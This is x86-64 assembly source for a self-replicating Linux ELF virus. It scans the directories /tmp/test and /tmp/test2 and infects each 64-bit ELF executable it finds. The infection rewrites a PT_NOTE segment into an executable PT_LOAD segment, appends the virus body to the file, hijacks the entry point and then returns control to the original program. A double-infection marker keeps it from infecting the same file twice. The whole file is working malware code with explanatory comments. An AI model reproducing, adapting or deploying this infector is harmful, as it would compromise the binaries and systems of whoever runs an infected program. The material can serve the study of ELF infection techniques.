BITS 64

%include "defines.s"
virus_len equ _end - _start
virus_lenq equ virus_len / 8
virus_lenb equ virus_len % 8

section .text
    global _start

; [rsp]     cwd_fd
_start:
    push    rdi
    push    rsi
    push    rdx
    push    rbx
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x10
    lea     rdi, [rel cwd]
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     al, SYS_OPEN
    syscall
    mov     [rsp], eax      ; We open and save the fd of the cwd so that we will be able
                            ; to chdir back to it after we are don

    lea     rdi, [rel dir1] ; /tmp/test
    call    readdir
    lea     rdi, [rel dir2] ; /tmp/test2
    call    readdir

    mov     edi, [rsp]
    xor     eax, eax
    add     al, SYS_FCHDIR
    syscall                 ; Back to our initial cwd to not break the executed binary (eg. ls)
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    syscall

    leave
    pop    rbx
    pop    rdx
    pop    rsi
    pop    rdi
    jmp     _end
final_jmp_offset equ $ - _start

; [rsp]         fd
; [rsp + 0x4]   buf_len
; [rsp + 0x8]   buffer
; [rsp + 0x10]  index
readdir:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20
    mov     eax, SYS_CHDIR  ; Let's change the directory to open file,
                            ; string operations are painful in ASM so relative paths will do
    syscall

    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     eax, SYS_OPEN
    syscall
    mov     [rsp], eax

    xor     rdi, rdi
    mov     rsi, 0x1000
    add     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
    xor     r8, r8
    dec     r8
    xor     r9, r9
    xor     eax, eax
    add     al, SYS_MMAP
    syscall                 ; We map a page for the getdents buffer

    test    al, al
    jnz     end_readdir
    mov     [rsp + 0x8], rax

loop_dir:
    mov     edi, [rsp]
    mov     rsi, [rsp + 0x8]
    mov     rdx, DIRENT_MAX_SIZE
    xor     eax, eax
    add     al, SYS_GETDENTS64
    syscall
    cmp     eax, 0

    jle     end_readdir
    mov     [rsp + 0x4], eax
    xor     r8, r8

loop_buf_dirent:
    mov     [rsp + 0x10], r8w
    mov     r9, [rsp + 0x8]
    cmp     BYTE [r9 + r8 + d_type], DT_REG
    jne     next_dirent
    lea     rdi, [r9 + r8 + d_name]
    call    infect          ; We only infect regular files 

next_dirent:
    mov     r9, [rsp + 0x8]
    movzx   r8, WORD [rsp + 0x10]
    add     r8w, [r9 + r8 + d_reclen]
    cmp     r8w, [rsp + 4]
    jl      loop_buf_dirent
    jmp     loop_dir

end_readdir:
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    syscall

    mov     rdi, [rsp + 0x8]
    mov     rsi, 0x1000
    mov     eax, SYS_MUNMAP
    syscall
    leave
    ret

infect:
    push    rbp
    mov     rbp, rsp
    sub     rsp, INFECTOR_STRUCT_SIZE

    mov     esi, O_RDWR
    mov     eax, SYS_OPEN
    syscall
    cmp     eax, 0
    jl      quit_infect

    mov     [rsp + inf_fd], eax
    mov     edi, [rsp + inf_fd]
    lea     rsi, [rsp + inf_elfhdr]
    mov     rdx, ELFHDR_SIZE
    mov     eax, SYS_READ
    syscall

    lea     rbx, [rsp + inf_elfhdr]
    lea     rax, [rbx + e_ident]
    cmp     [rax], DWORD ELF_MAGIC
    jne     close_quit_infect
    cmp     [rax + EI_CLASS], BYTE ELFCLASS64
    jne     close_quit_infect
    cmp     [rax + EI_DATA], BYTE ELFDATA2LSB       ; Only ELF 64 bits are being taken into account
    jne     close_quit_infect
    cmp     [rax + EI_PAD], DWORD INFECTION_MAGIC   ; We check them to avoid double infection
    je      close_quit_infect

    mov     rdx, [rax + e_phnum]
    test    rdx, rdx
    je      close_quit_infect
    mov     ax, [rbx + e_type]
    cmp     ax, ET_EXEC
    je      right_type_check
    cmp     ax, ET_DYN
    jne     close_quit_infect

right_type_check:
    mov     edi, [rsp + inf_fd]
    xor     rsi, rsi
    mov     rdx, SEEK_END
    mov     eax, SYS_LSEEK
    syscall
    mov     [rsp + inf_filesize], rax

    mov     rsi, rax
    xor     rdi, rdi
    mov     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_SHARED
    mov     r8d, [rsp + inf_fd]
    xor     r9, r9
    mov     eax, SYS_MMAP
    syscall                     ; We map the file into memory to operate on it
    test    al, al

    jnz     close_quit_infect
    mov     [rsp + inf_map], rax

    mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; Mark binary for infection
    mov     QWORD [rsp + inf_notehdr], 0

    mov     r8, rax
    add     r8, [rax + e_phoff]
    movzx   rcx, WORD [rax + e_phnum]
loop_phdrs:
    cmp     [r8 + p_type], DWORD PT_NOTE
    jne     cmp_load_phdr
    mov     QWORD [rsp + inf_notehdr], r8
cmp_load_phdr:
    cmp     [r8 + p_type], DWORD PT_LOAD
    jne     next_phdr
    mov     QWORD [rsp + inf_last_pt_load], r8
next_phdr:
    add     r8w, [rax + e_phentsize]
    loop    loop_phdrs

check_if_note_exists:
    mov     rax, [rsp + inf_notehdr]
    test    rax, rax
    jz      munmap_quit_infect

patch_note_phdr:
    mov     rax, [rsp + inf_notehdr]
    mov     [rax + p_type], DWORD PT_LOAD       ; We make it loadable
    mov     [rax + p_flags], DWORD PF_R | PF_X  ; And executable
    mov     rdx, QWORD [rsp + inf_filesize]     ; It starts at the EOF
    mov     QWORD [rax + p_offset], rdx
    mov     QWORD [rax + p_filesz], virus_len   ; We update the sizes
    mov     QWORD [rax + p_memsz], virus_len
    mov     QWORD [rax + p_align], 0x1000       ; And the alignement

    mov     rdx, [rsp + inf_last_pt_load]
    mov     rcx, [rdx + p_vaddr]                ; we get the last page used
    and     cx, 0xf000                          ; we align the address on page border
    add     rcx, [rsp + inf_filesize]           ; and we add the file size to it so that
                                                ; it will be on another page and also to keep
                                                ; offset and address consistent

    mov     [rax + p_vaddr], rcx                ; We put it after the last address mapped into memory
    mov     [rax + p_paddr], rcx                ; but we have to align it on another page

    sub     rax, [rsp + inf_map]                ; We convert our infected segment's address to
    mov     [rsp + inf_notehdr], rax            ; an offset in case remapping changes the map address
adjust_file_size:
    mov     edi, [rsp + inf_fd]
    mov     rsi, [rsp + inf_filesize]
    add     rsi, virus_len
    mov     QWORD [rsp + inf_new_filesize], rsi
    mov     eax, SYS_FTRUNCATE
    syscall
    test    eax, eax
    jnz     munmap_quit_infect

    mov     rdi, [rsp + inf_map]
    mov     rsi, [rsp + inf_filesize]
    mov     rdx, [rsp + inf_new_filesize]
    xor     r10, r10
    add     r10b, MREMAP_MAYMOVE
    mov     eax, SYS_MREMAP
    syscall
    test    al, al
    jnz     munmap_quit_infect
    mov     [rsp + inf_map], rax            ; This might break the reference to the phdrs
                                            ; but they are not needed anymore
    mov     rdi, [rsp + inf_map]
    add     rdi, [rsp + inf_filesize]
    lea     rsi, [rel _start]
    mov     rcx, virus_len
copy_payload:
    lodsb
    stosb
    loop    copy_payload

patch_entrypoint:
    mov     r8, [rsp + inf_map]
    mov     rax, r8
    add     rax, [rsp + inf_notehdr]
    mov     rdx, [r8 + e_entry]          ; We save the old entrypoint
    mov     rcx, [rax + p_vaddr]
    mov     QWORD [r8 + e_entry], rcx    ; We change the entrypoint to our code
    add     rcx, final_jmp_offset        ; The address to patch
    sub     rdx, rcx                     ; We have the relative jump
    mov     rcx, [rax + p_offset]
    add     rcx, r8
    add     rcx, final_jmp_offset - 4    ; The file offset of the address to patch
    mov     DWORD [rcx], edx             ; We return to the original entrypoint


munmap_quit_infect:
    mov     rdi, [rsp + inf_map]
    mov     rsi, [rsp + inf_filesize]
    mov     eax, SYS_MSYNC
    syscall

    mov     rdi, [rsp + inf_map]
    mov     rsi, [rsp + inf_filesize]
    mov     eax, SYS_MUNMAP
    syscall

close_quit_infect:
    mov     edi, [rsp + inf_fd]
    mov     eax, SYS_CLOSE
    syscall

quit_infect:
    leave
    ret

    signature: db 0, SIGNATURE, 0
    dir1: db "/tmp/test/", 0
    dir2: db "/tmp/test2/", 0
    cwd: db ".", 0

_end:
    xor     rdi, rdi
    mov     eax, SYS_EXIT
    syscall
